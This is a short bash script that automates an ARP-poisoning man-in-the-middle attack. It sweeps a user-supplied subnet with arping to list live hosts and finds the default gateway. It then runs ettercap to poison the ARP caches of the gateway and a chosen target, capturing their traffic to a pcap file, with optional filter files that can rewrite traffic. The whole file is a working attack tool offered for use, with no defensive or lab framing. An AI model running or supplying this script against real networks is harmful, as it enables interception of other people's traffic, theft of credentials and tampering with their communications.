#!/bin/bash

if ! command -v ettercap &> /dev/null
then
    echo "ettercap is not found! Please install it first"
    exit 1
fi

if ! command -v arping &> /dev/null
then
    echo "arping is not found! Please install it first"
    exit 1
fi

# We read the first three octets from the user
echo "Please enter the first three octets of an IP address (e.g. 192.168.100)"
read ip_part

if [[ -z $ip_part ]]; then
        echo "IP part cannot be empty!"
        exit 1
fi

echo "Listing IP found on the network..."

# We loop over possible IP addresses
for octet in {1..254}; do
    # We construct IP address
    ip_address="$ip_part.$octet"

    # We perform arping scan
    found_ip=$(arping -c 1 $ip_address | grep "reply from" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
    if ! [[ -z $found_ip ]]; then
    	echo "Found IP: $found_ip"
    fi
done

# Identify gateway IP address
GATEWAY_IP=$(ip route | awk '/default/ {print $3}')

echo "This is the default gateway: $GATEWAY_IP"


# We get the target IP from the user
echo "Please enter an IP address to as a target for MiTM"
read IP

if [[ -z $IP ]]; then
	echo "IP cannot be empty!"
	exit 1
fi

# We display list of network interfaces
echo "Please choose a network interface"
ip link show | awk -F': ' '/^[0-9]+:/{print $2}'
read ninterface
if [[ -z $ninterface ]]; then 
	echo "Network interface cannot be empty!"
	exit 1
fi

#We get filters from the user
echo "Please enter filter file for ettercap, you can leave it empty!"
read filters

if ! [[ -z $filters ]]; then
	applyfilters="-F $filters"
fi


#We start ARP poisoning and capture traffic
sudo ettercap -T -S $applyfilters -w output.pcap -i $ninterface -M arp:remote /$GATEWAY_IP// /$IP//





